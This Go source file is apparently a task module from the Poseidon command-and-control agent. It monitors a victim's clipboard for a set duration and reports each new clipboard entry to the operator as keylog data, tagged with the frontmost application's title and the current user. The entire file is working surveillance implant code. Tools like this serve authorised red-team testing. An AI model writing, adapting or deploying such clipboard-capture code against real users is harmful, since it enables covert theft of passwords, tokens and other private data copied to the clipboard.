package clipboard_monitor

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Duration int `json:"duration"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()
	params := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	elapsedDuration := 0
	currentClipboardCount := 0
	for params.Duration < 0 || elapsedDuration < params.Duration {
		if task.ShouldStop() {
			msg.Completed = true
			msg.Status = "completed"
			task.Job.SendResponses <- msg
			return
		}
		output, err := CheckClipboard(currentClipboardCount)
		if err != nil {
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
		if output != "" {
			msg.UserOutput = output + "\n"
			keylogData := make([]structs.Keylog, 1)
			keylogData[0].Keystrokes = output
			keylogData[0].WindowTitle, _ = GetFrontmostApp()
			keylogData[0].User = functions.GetUser()
			msg.Keylogs = &keylogData
			task.Job.SendResponses <- msg
		}
		currentClipboardCount, err = GetClipboardCount()
		if err != nil {
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
		elapsedDuration++
		WaitForTime()
	}
	msg.Completed = true
	msg.UserOutput = "\n\n[*] Finished Monitoring"
	task.Job.SendResponses <- msg
	return

}
